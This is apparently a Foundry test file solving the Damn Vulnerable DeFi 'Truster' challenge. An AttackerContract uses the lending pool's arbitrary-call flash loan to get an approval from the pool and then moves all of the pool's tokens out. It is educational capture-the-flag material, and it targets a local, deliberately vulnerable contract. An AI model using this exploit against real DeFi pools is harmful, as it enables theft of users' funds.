// SPDX-License-Identifier: MIT
// Damn Vulnerable DeFi v4 (https://damnvulnerabledefi.xyz)
pragma solidity =0.8.25;

import {Test, console} from "forge-std/Test.sol";
import {DamnValuableToken} from "../../src/DamnValuableToken.sol";
import {TrusterLenderPool} from "../../src/truster/TrusterLenderPool.sol";

contract TrusterChallenge is Test {
    address deployer = makeAddr("deployer");
    address player = makeAddr("player");
    address recovery = makeAddr("recovery");
    
    uint256 constant TOKENS_IN_POOL = 1_000_000e18;

    DamnValuableToken public token;
    TrusterLenderPool public pool;

    modifier checkSolvedByPlayer() {
        vm.startPrank(player, player);
        _;
        vm.stopPrank();
        _isSolved();
    }

    /**
     * SETS UP CHALLENGE - DO NOT TOUCH
     */
    function setUp() public {
        startHoax(deployer);
        // Deploy token
        token = new DamnValuableToken();

        // Deploy pool and fund it
        pool = new TrusterLenderPool(token);
        token.transfer(address(pool), TOKENS_IN_POOL);

        vm.stopPrank();
    }

    /**
     * VALIDATES INITIAL CONDITIONS - DO NOT TOUCH
     */
    function test_assertInitialState() public view {
        assertEq(address(pool.token()), address(token));
        assertEq(token.balanceOf(address(pool)), TOKENS_IN_POOL);
        assertEq(token.balanceOf(player), 0);
    }

    /**
     * CODE YOUR SOLUTION HERE
     */
    function test_truster() public checkSolvedByPlayer {
        console.log("Initial DVT tokens of the deployer: ", token.balanceOf(deployer)); // startHoax was called as a deployer
        console.log("Initial DVT tokens of the player: ", token.balanceOf(player)); // this contract address is the attacker contract. The player address is the address of the attacker.
        console.log("Initial DVT tokens of the lending pool: ", token.balanceOf(address(pool)));
        
        new AttackerContract(token.balanceOf(address(pool)), token, recovery, pool);

        console.log("Final DVT token of the lending pool: ", token.balanceOf(address(pool)));
        console.log("Final DVT token of the recovery account: ", token.balanceOf(recovery));
    }

    /**
     * CHECKS SUCCESS CONDITIONS - DO NOT TOUCH
     */
    function _isSolved() private view {
        // Player must have executed a single transaction
        assertEq(vm.getNonce(player), 1, "Player executed more than one tx");

        // All rescued funds sent to recovery account
        assertEq(token.balanceOf(address(pool)), 0, "Pool still has tokens");
        assertEq(token.balanceOf(recovery), TOKENS_IN_POOL, "Not enough tokens in recovery account");
    }
}

contract AttackerContract{
    constructor(uint256 _amount, DamnValuableToken _token, address _recovery, TrusterLenderPool _pool){
        address spender = address(this);
        // the vulnerable pool contract will approve this attacker contract to spend on its behalf.
        bytes memory data = abi.encodeWithSelector(_token.approve.selector , spender, _amount);

        _pool.flashLoan(0, address(this), address(_token),data); // This contract is taking 0 flash loans and data will make sure that this contract is .approved() of the Flash loan lender balance.

        // Now that this contract is given the approval, it will transfer the fund from the pool to the recovery account.
        _token.transferFrom(address(_pool),_recovery, _token.balanceOf(address(_pool)));
    }
}
